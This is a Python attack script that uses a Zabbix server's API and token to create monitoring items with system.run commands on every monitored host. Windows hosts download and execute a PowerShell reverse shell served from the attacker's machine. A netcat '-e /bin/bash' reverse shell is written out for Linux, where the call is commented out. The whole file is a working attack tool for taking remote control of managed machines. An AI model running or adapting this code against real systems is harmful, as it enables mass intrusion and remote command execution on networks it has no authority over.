import requests
import json
import base64
import os
import subprocess
import time
# Configurações da API
zabbix_url = 'http://192.168.29.235:8080/api_jsonrpc.php'
headers = {'Content-Type': 'application/json'}
auth_token = 'xxxxxxxxxxxxxxxx'
ip_shell = "192.168.29.11"
port_ip  = "4441"



payload_win = f"""
do {{
    Start-Sleep -Seconds 1
    try {{
        $ClienteTCP = New-Object Net.Sockets.TCPClient("{ip_shell}", {port_ip})
    }} catch {{}}
}} until ($ClienteTCP.Connected)

$FluxoDeRede = $ClienteTCP.GetStream()
$EscritorDeFluxo = New-Object IO.StreamWriter($FluxoDeRede)

function EscreverNoFluxo ($Texto) {{
    [byte[]]$script:BufferDeRecepcao = 0..$ClienteTCP.ReceiveBufferSize | % {{0}}
    $EscritorDeFluxo.Write($Texto + 'SHELL> ')
    $EscritorDeFluxo.Flush()
}}

EscreverNoFluxo ''

while(($BytesLidos = $FluxoDeRede.Read($BufferDeRecepcao, 0, $BufferDeRecepcao.Length)) -gt 0) {{
    $ComandoRecebido = ([text.encoding]::UTF8).GetString($BufferDeRecepcao, 0, $BytesLidos - 1)
    $SaidaDeComando = try {{
        Invoke-Expression $ComandoRecebido 2>&1 | Out-String
    }} catch {{
        $_ | Out-String
    }}
    EscreverNoFluxo ($SaidaDeComando)
}}

$EscritorDeFluxo.Close()
"""

shell = f"""
powershell -ep Bypass {payload_win}
"""

with open("shell.ps1", 'w') as f:  
    f.write(shell)



server_process = subprocess.Popen(["python3", "-m", "http.server", "9999"], cwd=os.getcwd())



def listar_interface_host(auth_token):
    data = {
        "jsonrpc": "2.0",
        "method": "host.get",
        "params": {
            "output": [
                "hostid",
                "host"
            ],
            "selectInterfaces": [
                "interfaceid",
                "ip"
            ]
        },
        "auth": auth_token,
        "id": 2
    }

    response = requests.post(zabbix_url, headers=headers, data=json.dumps(data))

    if response.status_code != 200:
        print(f"Erro ao conectar na API: {response.status_code}, {response.text}")
        return None

    response_data = response.json()

    if "result" not in response_data:
        print(f"Erro na resposta da API: {response_data}")
        return None

    return response_data


# Função para verificar e excluir item existente
def verificar_e_excluir_item(auth_token, hostid, name):
    payload_get = {
        "jsonrpc": "2.0",
        "method": "item.get",
        "params": {
            "output": ["itemid"],
            "hostids": hostid,
            "search": {
                "name": name
            }
        },
        "auth": auth_token,
        "id": 3
    }
    response = requests.post(zabbix_url, headers=headers, data=json.dumps(payload_get))
    items = response.json().get('result', [])
    
    if items:
        item_ids = [item['itemid'] for item in items]
        payload_delete = {
            "jsonrpc": "2.0",
            "method": "item.delete",
            "params": item_ids,
            "auth": auth_token,
            "id": 4
        }
        delete_response = requests.post(zabbix_url, headers=headers, data=json.dumps(payload_delete))
        print(f"Itens excluídos: {delete_response.json()}")


# Função para criar o item no host
def write_code_in_host_linux(auth_token, hostid, interfaceid, ip_shell, port_ip):
    name = "nc trad"
    verificar_e_excluir_item(auth_token, hostid, name)  # Excluir item existente, se houver
    
    payload_create = {
        "jsonrpc": "2.0",
        "method": "item.create",
        "params": {
            "name": name,
            "key_": f"system.run[nc.traditional {ip_shell} {port_ip} -e /bin/bash ,nowait]",
            "hostid": hostid,
            "type": 0,  # Zabbix agent
            "value_type": 3,  # Tipo de retorno (3 significa log)
            "interfaceid": interfaceid,
            "delay": "60s"
        },
        "auth": auth_token,
        "id": 5
    }
    response = requests.post(zabbix_url, headers=headers, data=json.dumps(payload_create))
    print(f"Item criado: {response.json()}")



def write_code_in_host_win(auth_token, hostid, interfaceid):
    name = "powershell_simple"
    verificar_e_excluir_item(auth_token, hostid, name)  # Excluir item existente, se houver
    
    payload_create = {
        "jsonrpc": "2.0",
        "method": "item.create",
        "params": {
            "name": name,
            "key_": f"system.run[powershell -Command \"(New-Object Net.WebClient).DownloadString('http://{ip_shell}:9999/shell.ps1') | Invoke-Expression\",nowait]",
            "hostid": hostid,
            "type": 0,  # Zabbix agent
            "value_type": 3,  # Tipo de retorno (3 significa log)
            "interfaceid": interfaceid,
            "delay": "60s"
        },
        "auth": auth_token,
        "id": 5
    }
    response = requests.post(zabbix_url, headers=headers, data=json.dumps(payload_create))
    print(f"Item criado: {response.json()}")
    

try:
    response_data = listar_interface_host(auth_token)
    if response_data and "result" in response_data:
        for host in response_data['result']:
            hostid = host['hostid']
            hostname = host['host']
            interfaceid = host['interfaces'][0]['interfaceid']  # Pega o primeiro 'interfaceid'
            
            if hostname == "server-linux":
                # write_code_in_host_linux(auth_token,hostid,interfaceid,ip_shell,port_ip)
                print("executou no host linux")
            else:
                write_code_in_host_win(auth_token,hostid,interfaceid)
                print("executou no host Windows")
finally:
    time.sleep(20)
    server_process.terminate()
    print("Servidor HTTP encerrado.")


